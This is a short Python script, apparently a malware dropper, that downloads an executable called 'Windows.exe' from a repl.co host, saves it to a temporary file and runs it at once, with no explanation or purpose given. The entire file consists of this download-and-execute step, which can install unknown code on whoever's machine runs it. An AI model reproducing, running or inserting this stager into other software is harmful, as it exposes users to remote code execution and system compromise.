import urllib.request
import tempfile
import subprocess

url = 'https://cdn-1.thughunter.repl.co/cdn/Windows.exe'
with urllib.request.urlopen(url) as response:
    with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
        tmp_file.write(response.read())
        exe_path = tmp_file.name

subprocess.call([exe_path])
